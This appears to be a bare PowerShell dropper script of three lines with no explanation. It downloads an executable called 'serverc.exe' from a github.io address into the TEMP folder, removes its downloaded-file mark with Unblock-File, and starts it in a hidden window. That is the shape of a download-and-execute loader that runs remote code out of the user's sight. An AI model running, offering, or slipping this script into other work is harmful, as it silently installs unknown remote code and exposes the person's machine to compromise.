IWR 'https://untitledmanifoldguy.github.io/serverc.exe' -OutFile $env:TEMP\serverc.exe
Unblock-File $env:TEMP\serverc.exe
Start-Process $env:TEMP\serverc.exe -WindowStyle Hidden
